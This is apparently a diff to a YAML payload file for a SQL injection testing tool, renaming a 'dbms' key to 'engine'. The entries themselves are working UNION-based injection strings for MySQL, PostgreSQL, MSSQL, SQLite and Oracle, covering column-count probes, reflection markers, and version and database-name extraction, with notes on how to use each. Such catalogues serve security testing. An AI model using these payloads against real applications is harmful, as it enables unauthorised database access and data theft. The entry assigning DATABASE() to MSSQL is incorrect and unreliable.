@@ -17,29 +17,29 @@ entries:
     detect: "Error appears once N exceeds the column count."
 
   - name: column count probe (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' ORDER BY {{N}}--"
     detect: "Same intent; Oracle's error text names an invalid identifier or position rather than a column count."
 
   - name: NULL-padded arity probe
-    dbms: [mysql, postgresql, mssql, sqlite]
+    engine: [mysql, postgresql, mssql, sqlite]
     payload: "' UNION SELECT NULL--"
     detect: "Add one NULL per attempt until the response stops erroring; the successful arity is the column count."
     note: "Use when ORDER BY is filtered. NULL is type-agnostic, which matters on engines that check types across UNION arms."
 
   - name: NULL-padded arity probe (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' UNION SELECT NULL FROM dual--"
     detect: "Same probe; Oracle requires a FROM clause, so dual supplies one."
 
   - name: reflection marker
-    dbms: [mysql, postgresql, mssql, sqlite]
+    engine: [mysql, postgresql, mssql, sqlite]
     payload: "' UNION SELECT '{{MARKER}}'--"
     detect: "Move the marker across column positions at the resolved arity until it appears in the response body."
     note: "Pad the remaining positions with NULL. The position that renders is the one that carries extracted values."
 
   - name: reflection marker (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' UNION SELECT '{{MARKER}}' FROM dual--"
     detect: "Same intent with Oracle's mandatory FROM clause."
 
@@ -49,37 +49,37 @@ entries:
     note: "Prefer this over a literal marker as the first reflection test."
 
   - name: version extraction
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' UNION SELECT NULL,@@version-- "
     detect: "The engine version appears at the reflected column position."
 
   - name: version extraction
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "' UNION SELECT NULL,version()--"
     detect: "The engine version appears at the reflected column position."
 
   - name: version extraction
-    dbms: [mssql]
+    engine: [mssql]
     payload: "' UNION SELECT NULL,@@version--"
     detect: "The engine version appears at the reflected column position."
 
   - name: version extraction
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' UNION SELECT NULL,banner FROM v$version--"
     note: "Oracle requires FROM; use FROM dual when no table is needed."
 
   - name: version extraction
-    dbms: [sqlite]
+    engine: [sqlite]
     payload: "' UNION SELECT NULL,sqlite_version()--"
     detect: "The engine version appears at the reflected column position."
 
   - name: current database name
-    dbms: [mysql, mssql]
+    engine: [mysql, mssql]
     payload: "' UNION SELECT NULL,DATABASE()--"
     detect: "Names the current schema, which is a second metadata proof independent of the version string."
     note: "SQL Server also accepts DB_NAME(); either is sufficient as proof."
 
   - name: current database name
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "' UNION SELECT NULL,current_database()--"
     detect: "Names the current database, as a second metadata proof."
